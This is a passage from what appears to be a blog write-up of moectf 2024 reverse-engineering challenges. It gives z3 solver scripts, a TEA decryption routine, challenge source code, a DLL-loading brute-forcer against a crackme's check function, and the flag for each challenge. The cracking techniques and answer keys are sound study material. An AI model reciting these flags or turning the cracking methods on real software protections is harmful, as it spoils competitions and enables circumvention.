class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    explode_bomb();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>值得注意的是 input ^ mask &#x3D;&#x3D; 114 ，其中由于运算符优先级，右边 mask &#x3D;&#x3D; 114 会被优先计算，很多选手都认为是题目的问题，而且python中，左边反而会被先计算…算是一个坑</li></ul><p><code>moectf&#123;CoUnter_TerR0rists_w1n&#125;</code></p><h1 id="SMCProMax"><a href="#SMCProMax" class="headerlink" title="SMCProMax"></a>SMCProMax</h1><p>SMC + 偷偷改东西 + z3使用<br>先动调，发现smc解密异或0x90，然后就可以patch，然后拖入IDA，可以抄出来一个类似hash的算法，但是这个算法是可以求解其输入的，我们就可以解了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line"></span><br><span class="line">keys = [<span class="number">2053092702</span>,-<span class="number">490481854</span>,-<span class="number">1704322843</span>,-<span class="number">1418679088</span>,<span class="number">86802781</span>,<span class="number">987171458</span>,<span class="number">965631658</span>,<span class="number">264545711</span>,-<span class="number">1342106783</span>,-<span class="number">825370173</span>]</span><br><span class="line">x = [BitVec(<span class="string">f&quot;x<span class="subst">&#123;i&#125;</span>&quot;</span>, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(keys))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">v</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="comment"># 由于左移会变偶数，而xor后又会变成奇数，所以有唯一解</span></span><br><span class="line">        v = If(v &lt; <span class="number">0</span> , (v &lt;&lt; <span class="number">1</span>) ^ <span class="number">0xc4f3b4b3</span>, v &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(keys)):</span><br><span class="line">    s.add(<span class="built_in">hash</span>(x[i]) == keys[i])</span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line"></span><br><span class="line">result = [<span class="number">0</span>] * <span class="built_in">len</span>(keys)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> m.decls():</span><br><span class="line">    result[<span class="built_in">int</span>(p.name()[<span class="number">1</span>:])] = m[p].as_long()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(l2b(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># moectf&#123;y0u_mu5t_know_vvHAt_1s__SMC__n0w&#125;</span></span><br></pre></td></tr></table></figure><p>但是要注意，这是程序在后面判断flag的逻辑<br>在此之前，程序偷偷修改了H字符，让它异或了0x12，所以正确的flag是</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;y0u_mu5t_know_vvZAt_1s__SMC__n0w&#125;</span><br><span class="line">真不容易啊，终于对了！！这就是逆向，豪吃，多吃。</span><br><span class="line">Press any key to continue . . .</span><br></pre></td></tr></table></figure><p><code>moectf&#123;y0u_mu5t_know_vvZAt_1s__SMC__n0w&#125;</code></p><h1 id="ezMAZE-彩蛋"><a href="#ezMAZE-彩蛋" class="headerlink" title="ezMAZE-彩蛋"></a>ezMAZE-彩蛋</h1><p>接上文ezMAZE题目，在地图可以找到<br><code>moectf&#123;LUOSB&#125;</code></p><h1 id="xor-大嘘"><a href="#xor-大嘘" class="headerlink" title="xor(大嘘)"></a>xor(大嘘)</h1><p>XOR里面藏了一个TEA，并且有花指令，ida直接看不出来。<br>EXP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">32</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ans[] = &#123;</span><br><span class="line"><span class="number">0x2B</span>, <span class="number">0xF2</span>, <span class="number">0x82</span>, <span class="number">0x41</span>, <span class="number">0x48</span>, <span class="number">0x74</span>, <span class="number">0x9D</span>, <span class="number">0xAA</span>, <span class="number">0x7E</span>, <span class="number">0x4C</span>, <span class="number">0xDA</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x2C</span>, <span class="number">0xA8</span>, <span class="number">0x52</span>,</span><br><span class="line"> <span class="number">0x97</span>, <span class="number">0x77</span>, <span class="number">0xB7</span>, <span class="number">0x3B</span>, <span class="number">0x16</span>, <span class="number">0x2D</span>, <span class="number">0xD4</span>, <span class="number">0xFC</span>, <span class="number">0x60</span>, <span class="number">0xBE</span>, <span class="number">0xC4</span>, <span class="number">0xB6</span>, <span class="number">0x73</span>, <span class="number">0x19</span>, <span class="number">0x94</span>, <span class="number">0x87</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> axxxx[] = &#123;</span><br><span class="line"><span class="number">0x3C</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x1F</span>, <span class="number">0x30</span>, <span class="number">0x6E</span>, <span class="number">0x1E</span>, <span class="number">0x30</span>, <span class="number">0x04</span>, <span class="number">0x3C</span>, <span class="number">0x12</span>, <span class="number">0x52</span>, <span class="number">0x59</span>, <span class="number">0x03</span>, <span class="number">0x6D</span>, <span class="number">0x52</span>,</span><br><span class="line"> <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x0B</span>, <span class="number">0x33</span>, <span class="number">0x1F</span>, <span class="number">0x33</span>, <span class="number">0x17</span>, <span class="number">0x3B</span>, <span class="number">0x17</span>, <span class="number">0x1A</span>, <span class="number">0x2B</span>, <span class="number">0x07</span>, <span class="number">0x55</span>, <span class="number">0x04</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        axxxx[i] ^= ans[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* xxx = <span class="string">&quot;hello_moectf2024&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span>* v = (<span class="type">uint32_t</span>*)axxxx;</span><br><span class="line">    <span class="type">uint32_t</span>* k = (<span class="type">uint32_t</span>*)xxx;</span><br><span class="line">    decrypt(v, k);</span><br><span class="line">    decrypt(v+<span class="number">2</span>, k);</span><br><span class="line">    decrypt(v+<span class="number">4</span>, k);</span><br><span class="line">    decrypt(v+<span class="number">6</span>, k);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* vv = (<span class="type">unsigned</span> <span class="type">char</span>*)v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        vv[i] ^= xxx[i % <span class="number">16</span>];</span><br><span class="line">        <span class="built_in">putchar</span>(vv[i]);</span><br><span class="line">        <span class="comment">// moectf&#123;how_an_easy_junk_and_tea&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>moectf&#123;how_an_easy_junk_and_tea&#125;</code></p><h1 id="babe-z3"><a href="#babe-z3" class="headerlink" title="babe-z3"></a>babe-z3</h1><p>src</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;$ root@moectf2024 ~&gt; Welcome to moectf 2024!\n | 0xcafebabe encountered a difficult challenge!!!\n | He was lost in the z3-solver&#x27;s WORLD, Please Use Your MAGIC to help him.\n | input: moectf&#123;YOUR_INPUT&#125;&quot;</span>);</span><br><span class="line">        <span class="type">char</span> x[<span class="number">36</span>]; <span class="comment">//9c0525dcbadf4cbd9715067159453e74</span></span><br><span class="line">        <span class="built_in">fgets</span>(x, <span class="number">36</span>, stdin);</span><br><span class="line">        <span class="type">uint64_t</span> a1 = *(<span class="number">0</span> + (<span class="type">uint64_t</span>*)x);</span><br><span class="line">        <span class="type">uint64_t</span> a2 = *(<span class="number">1</span> + (<span class="type">uint64_t</span>*)x);</span><br><span class="line">        <span class="type">uint64_t</span> a3 = *(<span class="number">2</span> + (<span class="type">uint64_t</span>*)x);</span><br><span class="line">        <span class="type">uint64_t</span> a4 = *(<span class="number">3</span> + (<span class="type">uint64_t</span>*)x);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; (a1 &amp; a2 &amp; (~(a1 | a2) | a3 &amp; a2 | a4 &amp; a1 &amp; ~a4) | a4 &amp; a1 &amp; a3) &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; ((a2 ^ (a4 &amp; ~a1 | a4 &amp; ~a3 | (a1 + a3) &amp; a3 | (a2 + a4) &amp; a2 &amp; ~a1))) &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; ((a1 - a2) ^ (a3 - a4)) &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; ((a4 + a2) ^ (a1 + a3)) &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; (a1 ^ a2 ^ a3 ^ a4) &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; (a1 &amp; a2 &amp; a3 &amp; a4) &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; (a1 + a2 - a3 + a4) * (a1 + a3 - a4 + a2) &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; (a1 + a2 +a3 + a4) % 114514 &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        std::cout &lt;&lt; (a1 * a2 * a3 * a4) % 1919810 &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        <span class="type">uint64_t</span> switch_0 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">uint64_t</span> switch_1 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">uint64_t</span> switch_2 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">uint64_t</span> switch_3 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">uint64_t</span> switch_4 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">uint64_t</span> switch_5 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">uint64_t</span> switch_6 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">uint64_t</span> switch_7 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">uint64_t</span> switch_8 = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// FAKE CONDITION</span></span><br><span class="line">        <span class="keyword">if</span> ((a3 &amp; a1 &amp; (~(a4 + a2) | a2 &amp; a2 | a4 &amp; a1 &amp; ~a4) ^ a4 &amp; a3) == <span class="number">0xcafebabedeadc0de</span>) (switch_0 |= <span class="number">0x0000000010000000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((a1 &amp; a2 &amp; (~(a1 | a2) | a3 &amp; a2 | a4 &amp; a1 &amp; ~a4) | a4 &amp; a1 &amp; a3) == <span class="number">2316015897844654385</span>) switch_0 = (switch_0 |= <span class="number">0x0000000100000000</span>);</span><br><span class="line">        <span class="keyword">if</span>(((a2 ^ (a4 &amp; ~a1 | a4 &amp; ~a3 | (a1 + a3) &amp; a3 | (a2 + a4) &amp; a2 &amp; ~a1))) == <span class="number">8102257287365753684</span>) switch_1 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(((a1 - a2) ^ (a3 - a4)) == <span class="number">287668530830180307</span>) switch_2 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(((a4 + a2) ^ (a1 + a3)) == <span class="number">865433324338348261</span>) switch_3 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>((a1 ^ a2 ^ a3 ^ a4) == <span class="number">145809558366915671</span>) switch_4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>((a1 &amp; a2 &amp; a3 &amp; a4) == <span class="number">2314885599605039392</span>) switch_5 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(((a1 + a2 - a3 + a4) * (a1 + a3 - a4 + a2)) == <span class="number">1840182356754417097</span>) switch_6 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>((a1 + a2 + a3 + a4) % <span class="number">114514</span> == <span class="number">21761</span>) switch_7 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>((a1 * a2 * a3 * a4) % <span class="number">1919810</span> == <span class="number">827118</span>) switch_8 = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        DWORD fake = (DWORD)switch_0;</span><br><span class="line">        <span class="keyword">if</span> (switch_0 &amp;&amp; switch_1 &amp;&amp; switch_2 &amp;&amp; switch_3 &amp;&amp; switch_4 &amp;&amp; switch_5 &amp;&amp; switch_6 &amp;&amp; switch_7 &amp;&amp; switch_8 &amp;&amp; !fake)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Finally, You Win!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;NO!! Try Again. PLEASE&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题主要的坑其实是一个64位的变量的高32位和低32位控制了两个不同的条件，最后检查的时候，分别进行了检查，致敬RCTF2024的 PPTT（同样的操作，当时被恶心了）<br>Exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">f&quot;x<span class="subst">&#123;i&#125;</span>&quot;</span>, <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a1 = x[<span class="number">0</span>]</span><br><span class="line">a2 = x[<span class="number">1</span>]</span><br><span class="line">a3 = x[<span class="number">2</span>]</span><br><span class="line">a4 = x[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># This Condition Is Fake!(!=)</span></span><br><span class="line">s.add((a3 &amp; a1 &amp; (~(a4 + a2) | a2 &amp; a2 | a4 &amp; a1 &amp; ~a4) ^ a4 &amp; a3) != <span class="number">0xd81ac01fbba91837</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># These Are True.</span></span><br><span class="line">s.add((a1 &amp; a2 &amp; (~(a1 | a2) | a3 &amp; a2 | a4 &amp; a1 &amp; ~a4) | a4 &amp; a1 &amp; a3) == <span class="number">2316015897844654385</span>)</span><br><span class="line">s.add(((a2 ^ (a4 &amp; ~a1 | a4 &amp; ~a3 | (a1 + a3) &amp; a3 | (a2 + a4) &amp; a2 &amp; ~a1))) == <span class="number">8102257287365753684</span>)</span><br><span class="line">s.add(((a1 - a2) ^ (a3 - a4)) == <span class="number">287668530830180307</span>)</span><br><span class="line">s.add(((a1 + a2 - a3 + a4) * (a1 + a3 - a4 + a2)) == <span class="number">1840182356754417097</span>)</span><br><span class="line">s.add((a1 + a2 + a3 + a4) % <span class="number">114514</span> == <span class="number">21761</span>)</span><br><span class="line">s.add((a1 * a2 * a3 * a4) % <span class="number">1919810</span> == <span class="number">827118</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">m = s.model()</span><br><span class="line">result = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    result += long_to_bytes(m[i].as_long())[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># b&#x27;9c0525dcbadf4cbd9715067159453e74&#x27;</span></span><br></pre></td></tr></table></figure><p><code>moectf&#123;9c0525dcbadf4cbd9715067159453e74&#125;</code></p><h1 id="BlackHole"><a href="#BlackHole" class="headerlink" title="BlackHole"></a>BlackHole</h1><p>根据纸条内容，我们采用LoadLibrary然后调用函数进行暴力破解即可。<br>这是源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">        __declspec(dllexport) <span class="type">int</span> <span class="title function_">checkMyFlag</span><span class="params">(<span class="type">char</span>* your_flag, <span class="type">size_t</span> length)</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span> (length != <span class="number">15</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">memcmp</span>(your_flag, <span class="string">&quot;moectf&#123;&quot;</span>, <span class="number">7</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (your_flag[<span class="number">14</span>] != <span class="string">&#x27;&#125;&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (your_flag[<span class="number">7</span>] == <span class="string">&#x27;c&#x27;</span> &amp;&amp;</span><br><span class="line">                        your_flag[<span class="number">8</span>] == <span class="string">&#x27;r&#x27;</span> &amp;&amp;</span><br><span class="line">                        your_flag[<span class="number">9</span>] == <span class="string">&#x27;4&#x27;</span> &amp;&amp;</span><br><span class="line">                        your_flag[<span class="number">10</span>] == <span class="string">&#x27;c&#x27;</span> &amp;&amp;</span><br><span class="line">                        your_flag[<span class="number">11</span>] == <span class="string">&#x27;k&#x27;</span> &amp;&amp;</span><br><span class="line">                        your_flag[<span class="number">12</span>] == <span class="string">&#x27;m&#x27;</span> &amp;&amp;</span><br><span class="line">                        your_flag[<span class="number">13</span>] == <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EXP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bruteForce</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        HMODULE h = <span class="literal">NULL</span>;</span><br><span class="line">        h = LoadLibraryA(<span class="string">&quot;you_cannot_crack_me.vmp.dll&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!h)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;failed to load dll...\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(*checkFlag)</span><span class="params">(<span class="type">char</span>*, <span class="type">size_t</span>)</span>;</span><br><span class="line">        <span class="type">char</span>* cracking = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> (!cracking) <span class="keyword">return</span>;</span><br><span class="line">        cracking[<span class="number">0</span>] = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">        cracking[<span class="number">1</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">        cracking[<span class="number">2</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">        cracking[<span class="number">3</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">        cracking[<span class="number">4</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">        cracking[<span class="number">5</span>] = <span class="string">&#x27;f&#x27;</span>;</span><br><span class="line">        cracking[<span class="number">6</span>] = <span class="string">&#x27;&#123;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        cracking[<span class="number">7</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">        cracking[<span class="number">12</span>] = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        cracking[<span class="number">14</span>] = <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">        cracking[<span class="number">15</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        checkFlag check = (checkFlag)GetProcAddress(h, <span class="string">&quot;checkMyFlag&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> b = <span class="string">&#x27;a&#x27;</span>; b &lt;= <span class="string">&#x27;z&#x27;</span>; b++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">char</span> c = <span class="string">&#x27;0&#x27;</span>; c &lt;= <span class="string">&#x27;9&#x27;</span>; 